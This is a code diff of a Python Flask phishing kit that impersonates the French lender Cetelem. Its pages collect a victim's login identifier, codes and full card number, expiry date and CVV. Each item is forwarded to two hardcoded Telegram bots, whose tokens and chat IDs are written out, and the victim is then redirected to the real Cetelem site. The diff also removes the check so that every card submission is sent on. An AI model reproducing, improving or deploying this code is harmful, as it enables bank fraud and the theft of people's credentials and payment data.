@@ -11,25 +11,21 @@ CHAT_ID_1 = '5214147917'
 TOKEN_2 = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
 CHAT_ID_2 = '6297861735'
 
-
 def send_to_telegram(token, chat_id, message):
     url = f'https://api.telegram.org/bot{token}/sendMessage'
     data = {'chat_id': chat_id, 'text': message}
     try:
         requests.post(url, data=data)
     except Exception as e:
-        print(f"Erreur Telegram [{chat_id}]:", e)
-
+        print("Erreur Telegram :", e)
 
 def send_all(message):
     send_to_telegram(TOKEN_1, CHAT_ID_1, message)
     send_to_telegram(TOKEN_2, CHAT_ID_2, message)
 
-
 @app.route('/')
 def identifiant():
     return render_template('identifiant.html')
-
 
 @app.route('/code', methods=['POST'])
 def code():
@@ -38,7 +34,6 @@ def code():
         send_all(f"[Identifiant] {identifiant}")
         return render_template('code.html')
     return redirect('/')
-
 
 @app.route('/verification', methods=['GET', 'POST'])
 def verification():
@@ -52,7 +47,6 @@ def verification():
             print("Erreur JSON:", e)
             return redirect('/')
     return render_template('verification.html')
-
 
 @app.route('/securisation', methods=['POST'])
 def securisation():
@@ -71,19 +65,16 @@ def securisation():
         return render_template('securisation.html')
     return redirect('/verification')
 
-
 @app.route('/merci', methods=['POST'])
 def merci():
     carte = request.form.get('numero_carte')
     date_exp = request.form.get('date_expiration')
     cvv = request.form.get('cryptogramme')
 
-    if carte and date_exp and cvv:
-        message = f"[Carte] {carte} | Exp: {date_exp} | CVV: {cvv}"
-        send_all(message)
+    message = f"[Carte] {carte} | Exp: {date_exp} | CVV: {cvv}"
+    send_all(message)
 
     return redirect("https://www.cetelem.fr/fr/accueil")
-
 
 if __name__ == '__main__':
     app.run(debug=True)
